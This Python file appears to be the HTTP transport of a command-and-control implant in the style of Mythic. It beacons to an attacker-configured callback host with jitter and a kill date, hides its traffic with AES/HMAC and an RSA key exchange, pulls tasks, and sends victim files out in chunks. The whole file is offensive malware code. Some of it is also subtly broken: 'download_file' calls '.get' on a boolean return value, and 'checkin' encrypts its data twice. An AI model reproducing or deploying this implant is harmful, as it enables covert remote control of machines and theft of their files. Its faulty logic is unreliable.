import os
import json
import time
import base64
import random
import logging
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
import requests
from typing import Dict, List, Optional

logger = logging.getLogger("HTTPC2")

class HTTPC2:
    def __init__(self, config: Dict):
        self.base_url = self._normalize_url(config['callback_host'], config['callback_port'])
        self.interval = config['callback_interval']
        self.jitter = config.get('callback_jitter', 0.2)
        self.proxy = self._parse_proxy(config)
        self.aes_key = self._parse_aes_key(config.get('aes_psk', ''))
        self.headers = config.get('headers', [])
        self.session = self._create_session()
        self.kill_date = self._parse_kill_date(config.get('killdate', ''))
        self.using_key_exchange = config.get('encrypted_exchange', False)
        self.rsa_private_key = None

    def _normalize_url(self, host: str, port: str) -> str:
        if not host.startswith(('http://', 'https://')):
            scheme = 'https://' if port == '443' else 'http://'
            host = f"{scheme}{host}"
        
        if ':' not in host.split('//')[1]:
            host = f"{host}:{port}"
        
        return host

    def _parse_proxy(self, config: Dict) -> Dict:
        proxy = {}
        if config.get('proxy_host'):
            proxy['http'] = f"{config['proxy_host']}:{config['proxy_port']}"
            if config.get('proxy_user'):
                proxy['http'] = f"{config['proxy_user']}:{config['proxy_pass']}@{proxy['http']}"
        return proxy

    def _parse_aes_key(self, key: str) -> Optional[bytes]:
        if key:
            return base64.b64decode(key)
        return None

    def _parse_kill_date(self, killdate: str) -> Optional[float]:
        if killdate and killdate != 'yyyy-mm-dd':
            try:
                return time.mktime(time.strptime(killdate, "%Y-%m-%d"))
            except ValueError:
                pass
        return None

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        session.proxies = self.proxy
        session.headers.update({'User-Agent': 'Mythic-HTTP-Agent/1.0'})
        for header in self.headers:
            session.headers[header['key']] = header['value']
        return session

    def _check_kill_date(self):
        if self.kill_date and time.time() > self.kill_date:
            exit(0)

    def gen_sleep_time(self) -> float:
        jitter_factor = 1 + (random.uniform(-self.jitter, self.jitter))
        return self.interval * jitter_factor

    def encrypt_message(self, data: str) -> str:
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        pad_length = 16 - (len(data) % 16)
        padded_data = data.encode() + bytes([pad_length]*pad_length)
        ciphertext = encryptor.update(padded_data) + encryptor.finalize()

        h = hmac.HMAC(self.aes_key, hashes.SHA256(), backend=default_backend())
        h.update(iv + ciphertext)
        mac = h.finalize()

        payload = iv + ciphertext + mac
        return base64.b64encode(payload).decode()

    def decrypt_message(self, encrypted: str) -> str:
        data = base64.b64decode(encrypted)
        iv = data[:16]
        ciphertext = data[16:-32]
        mac = data[-32:]

        h = hmac.HMAC(self.aes_key, hashes.SHA256(), backend=default_backend())
        h.update(iv + ciphertext)
        h.verify(mac)

        cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        padded = decryptor.update(ciphertext) + decryptor.finalize()
        pad_length = padded[-1]
        return padded[:-pad_length].decode()

    def _generate_rsa_keypair(self):
        self.rsa_private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=4096,
            backend=default_backend()
        )

    def negotiate_key_exchange(self):
        self._generate_rsa_keypair()
        public_key = self.rsa_private_key.public_key().public_bytes(
            Encoding.DER,
            PublicFormat.SubjectPublicKeyInfo
        )
        
        session_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=20))
        payload = {
            'session_id': session_id,
            'pub_key': base64.b64encode(public_key).decode(),
            'action': 'staging_rsa'
        }
        
        response = self._post(payload, encrypt=False)
        encrypted_key = base64.b64decode(response['session_key'])
        
        decrypted_key = self.rsa_private_key.decrypt(
            encrypted_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA1()),
                algorithm=hashes.SHA1(),
                label=None
            )
        )
        
        self.aes_key = decrypted_key
        return response['uuid']

    def checkin(self, agent_info: Dict) -> bool:
        self._check_kill_date()
        
        if self.using_key_exchange and not self.aes_key:
            agent_info['uuid'] = self.negotiate_key_exchange()
        
        encrypted_data = self.encrypt_message(json.dumps(agent_info))
        response = self._post({'data': encrypted_data})
        
        if response.get('id'):
            return True
        return False

    def get_tasking(self) -> List[Dict]:
        self._check_kill_date()
        response = self._get()
        return response.get('tasks', [])

    def post_response(self, task_id: str, output: Dict) -> bool:
        payload = {
            'task_id': task_id,
            'output': self.encrypt_message(json.dumps(output))
        }
        return self._post(payload).get('status') == 'success'

    def _post(self, data: Dict, encrypt: bool = True) -> Dict:
        try:
            if encrypt and self.aes_key:
                data = {'data': self.encrypt_message(json.dumps(data))}
            
            response = self.session.post(
                f"{self.base_url}/post_uri",
                json=data,
                timeout=15
            )
            response.raise_for_status()
            
            if self.aes_key:
                return json.loads(self.decrypt_message(response.text))
            return response.json()
        except Exception as e:
            logger.error(f"POST failed: {str(e)}")
            time.sleep(self.gen_sleep_time())
            return {}

    def _get(self) -> Dict:
        try:
            params = {'query': base64.b64encode(json.dumps({'action': 'get_tasking'}).encode()).decode()}
            response = self.session.get(
                f"{self.base_url}/get_uri",
                params=params,
                timeout=10
            )
            response.raise_for_status()
            
            if self.aes_key:
                return json.loads(self.decrypt_message(response.text))
            return response.json()
        except Exception as e:
            logger.error(f"GET failed: {str(e)}")
            time.sleep(self.gen_sleep_time())
            return {}

    def download_file(self, task_id: str, file_path: str) -> Dict:
        chunk_size = 512000
        file_id = None
        
        try:
            with open(file_path, 'rb') as f:
                file_size = os.path.getsize(file_path)
                chunks = (file_size + chunk_size - 1) // chunk_size
                
                register = {
                    'total_chunks': chunks,
                    'full_path': os.path.abspath(file_path)
                }
                response = self.post_response(task_id, {'download': register})
                
                if response.get('status') != 'success':
                    return {'status': 'error', 'message': 'Registration failed'}
                
                file_id = response['file_id']
                
                for chunk_num in range(1, chunks+1):
                    chunk = f.read(chunk_size)
                    data = {
                        'chunk_num': chunk_num,
                        'chunk_data': base64.b64encode(chunk).decode(),
                        'file_id': file_id
                    }
                    self.post_response(task_id, {'download': data})
                    time.sleep(self.gen_sleep_time())
                
                return {'status': 'success', 'file_id': file_id}
        except Exception as e:
            return {'status': 'error', 'message': str(e)}

    def upload_file(self, task_id: str, file_id: str) -> bytes:
        chunk_num = 1
        total_data = b''
        
        while True:
            response = self._post({
                'action': 'get_chunk',
                'file_id': file_id,
                'chunk_num': chunk_num
            })
            
            if not response.get('chunk_data'):
                break
            
            total_data += base64.b64decode(response['chunk_data'])
            chunk_num += 1
        
        return total_data